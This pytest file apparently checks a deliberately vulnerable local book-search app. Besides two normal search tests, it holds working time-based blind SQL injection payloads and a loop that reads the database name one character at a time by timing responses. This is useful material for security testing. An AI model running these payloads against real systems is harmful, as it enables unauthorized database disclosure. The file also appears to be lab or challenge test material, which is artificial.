import pytest
import requests
import time

BASE_URL = "http://localhost:5000"

@pytest.mark.parametrize("query,expected", [
    ("Art", True),
    ("Nonexistent", False),
])
def test_search_normal(query, expected):
    resp = requests.get(f"{BASE_URL}/search", params={"q": query})
    assert resp.status_code == 200
    if expected:
        assert "Matching books found" in resp.text
    else:
        assert "No books matched" in resp.text

def test_blind_sqli_timing():
    # Payload: if true, sleep 3s; if false, no sleep
    true_payload = "test' OR IF(1=1,SLEEP(3),0)-- -"
    false_payload = "test' OR IF(1=2,SLEEP(3),0)-- -"
    t1 = time.time()
    requests.get(f"{BASE_URL}/search", params={"q": true_payload})
    t2 = time.time()
    requests.get(f"{BASE_URL}/search", params={"q": false_payload})
    t3 = time.time()
    true_delay = t2 - t1
    false_delay = t3 - t2
    assert true_delay > 2.5, f"Expected delay for true payload, got {true_delay}"
    assert false_delay < 2, f"Expected no delay for false payload, got {false_delay}"

def test_blind_sqli_extract_db_name():
    # Extract first 3 chars of DB name (should be 'acm')
    db_name = ''
    for pos in range(1, 4):
        for c in range(32, 127):
            payload = f"test' OR IF(ASCII(SUBSTRING((SELECT database()),{pos},1))={c},SLEEP(2),0)-- -"
            t1 = time.time()
            requests.get(f"{BASE_URL}/search", params={"q": payload})
            t2 = time.time()
            if t2 - t1 > 1.5:
                db_name += chr(c)
                break
    assert db_name == 'acm', f"Expected db name to start with 'acm', got {db_name}" 